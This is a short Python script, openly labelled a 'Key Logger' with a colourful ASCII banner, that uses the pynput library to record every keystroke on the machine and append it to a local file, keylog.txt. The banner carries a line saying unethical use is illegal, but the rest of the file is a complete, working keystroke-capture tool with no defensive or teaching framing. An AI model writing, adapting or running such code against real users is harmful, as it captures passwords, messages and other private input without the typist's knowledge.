import pynput
from pynput.keyboard import Key, Listener
#Terminal GUI
from termcolor import colored

text=r"""   
            __  __    _           _                
            \ \/ /___| |_   _ ___(_)_   _____      
             \  // __| | | | / __| \ \ / / _ \     
             /  \ (__| | |_| \__ \ |\ V /  __/     
            /_/\_\___|_|\__,_|___/_| \_/ \___|     
           ____          _                      
          / ___|   _ ___| |_ ___  _ __ ___  ___ 
         | |  | | | / __| __/ _ \| '_ ` _ \/ __|
         | |__| |_| \__ \ || (_) | | | | | \__ \
          \____\__,_|___/\__\___/|_| |_| |_|___/"""

import colorama
import random

colors = list(vars(colorama.Fore).values())
colored_chars = [random.choice(colors) + char for char in text]

print(''.join(colored_chars))

print(colored("                        Key Logger",color="white",attrs=['bold']))
print(colored("\n             - Developed by: Tebogo Thage II -",color="blue"))
print(colored("                - For: Xclusive Customs -",color="magenta"))
print(colored("\n\n        All key strokes will be saved to 'keylog.txt'",color="green"))
print(colored("   it is illegal to use this tool for unethical purposes!!!        \n",color="red",attrs=['bold']))
print(colored("\nNOW ACTIVE: [KEY LISTENING SCRIPT]                      version 4.20\n-----------> Press 'Ctrl+Z' to stop the script",color="green"))
# Beginning ------------------
# Define variables
log_file = "keylog.txt"

# Define functions
def on_press(key):
    """Write key presses to the log file."""
    with open(log_file, "a") as f:
        if type(key) == pynput.keyboard._xorg.KeyCode:
            try:
                f.write(key.char)
            except Exception:
                pass
        else:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            elif key == Key.backspace:
                f.write("<backspace>")
            elif str(key) == 'Key.caps_lock':
                f.write("<caps_lock>")
            elif str(key) == 'Key.tab':
                f.write("<tab>")

# Initialize the Listener
with Listener(on_press=on_press) as listener:
    listener.join()

